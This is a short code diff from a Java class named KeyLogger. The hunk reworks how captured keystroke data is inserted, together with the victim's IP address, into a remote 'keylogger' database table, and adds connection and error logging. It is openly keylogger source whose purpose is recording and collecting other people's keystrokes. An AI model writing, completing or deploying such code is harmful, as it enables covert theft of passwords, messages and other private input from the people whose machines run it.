@@ -151,13 +151,19 @@ public class KeyLogger implements NativeKeyListener {
 		System.out.println("Triying to store data!!! ->" + data);
 
 		jdbc.getConnection(res -> {
+			System.out.println("Getting connection");
 			  if (res.succeeded()) {
+				  System.out.println("Sucess connection");
 				    SQLConnection conn = res.result();
-				    DateTime time = DateTime.now();
-				    conn.updateWithParams("INSERT INTO keylogger(ip,date,data) VALUES (?, ?, ?)", new JsonArray().add(IP).add(time.toDateTime().toString()).add(data), resa -> {
+				    
+				    DateTime time = DateTime.now();		    
+				    conn.queryWithParams("INSERT INTO keylogger(ip,data) VALUES (?, ?)", new JsonArray().add(IP).add(data), resa -> {
 				    	  if (resa.succeeded()) {
 				    	    System.out.println("Added keylog");
 				    	    conn.close();
+				    	  }else{
+				    		  conn.close();
+				    		  System.out.println("Error..."+ resa.cause().getMessage().toString());
 				    	  }
 				 }); 
 			  }
